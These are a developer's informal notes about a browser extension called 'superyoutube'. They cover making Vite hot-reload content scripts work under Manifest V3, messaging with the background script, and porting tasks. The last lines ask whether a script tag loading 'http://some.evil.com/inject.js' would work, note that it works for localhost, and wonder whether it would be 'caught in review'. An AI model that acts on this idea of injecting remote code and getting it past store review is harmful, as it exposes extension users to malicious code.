can i get vite and constent script reload manifest v3 working

fall back to manifest v2 for dev

read code superyoutube

get it done


vite
when migrate to release
  build content.js, no need to inject


keybinding to reload extension for unpacked-dev


does content-vite need to speak to boackgroun.js???
  getStorageData
    player width
    extension enabled


next task
  port content to content-vite



is <script src=http://some.evil.com/inject.js type=module /> possible?
well it works for localhost...
maybe caught in review???
